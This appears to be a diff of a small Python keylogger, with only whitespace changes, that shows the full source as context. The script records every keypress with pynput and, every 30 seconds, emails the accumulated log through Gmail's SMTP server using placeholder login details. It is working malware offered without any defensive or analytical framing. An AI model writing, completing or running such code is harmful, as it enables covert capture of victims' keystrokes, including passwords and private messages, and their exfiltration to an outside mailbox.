@@ -1,7 +1,6 @@
 from pynput import keyboard
 import smtplib
 import threading
-
 log=""
 def callback(key):
     global log
@@ -14,18 +13,21 @@ def callback(key):
             log=log+"\n"
         else:
             log=log+str(key)
+            
 def email_send(gmail,pw,message):
     emailsend=smtplib.SMTP("smtp.gmail.com",587)
     emailsend.starttls()
     emailsend.login(gmail,pw)
     emailsend.sendmail(gmail,gmail,message)
     emailsend.quit()
+    
 def thread():
     global log
     email_send("gmail","password",log.encode("utf-8"))
     log=""
     timer=threading.Timer(30,thread)
     timer.start()
+    
 keyloger=keyboard.Listener(on_press=callback)
 with keyloger:
     thread()
